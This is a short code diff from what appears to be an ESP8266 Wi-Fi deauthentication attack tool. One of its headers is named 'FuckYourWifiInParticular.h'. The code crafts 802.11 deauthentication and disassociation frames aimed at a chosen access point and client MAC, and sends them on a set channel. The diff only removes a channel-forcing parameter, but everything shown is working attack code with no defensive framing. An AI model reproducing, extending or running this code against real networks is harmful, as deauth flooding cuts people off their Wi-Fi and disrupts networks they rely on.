@@ -1,4 +1,4 @@
-#include "string_utils.h"
+#include <string_utils.h>
 #include <FuckYourWifiInParticular.h>
 #include <ESP8266WiFi.h>
 
@@ -29,7 +29,7 @@ bool sendDeauth(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
     deauthpkt[24] = reason;
     deauthpkt[0] = 0xc0;
 
-    if (sendPacket(deauthpkt, packetSize, ch, true))
+    if (sendPacket(deauthpkt, packetSize, ch))
     {
         success = true;
     }
@@ -41,7 +41,7 @@ bool sendDeauth(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
 
     disassocpkt[0] = 0xa0;
 
-    if (sendPacket(disassocpkt, packetSize, ch, false))
+    if (sendPacket(disassocpkt, packetSize, ch))
     {
         success = true;
     }
@@ -49,7 +49,7 @@ bool sendDeauth(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
     return success;
 }
 
-bool sendPacket(uint8_t *packet, uint16_t packetSize, uint8_t ch, bool force_ch)
+bool sendPacket(uint8_t *packet, uint16_t packetSize, uint8_t ch)
 {
 
     // Serial.println(bytesToStr(packet, packetSize));
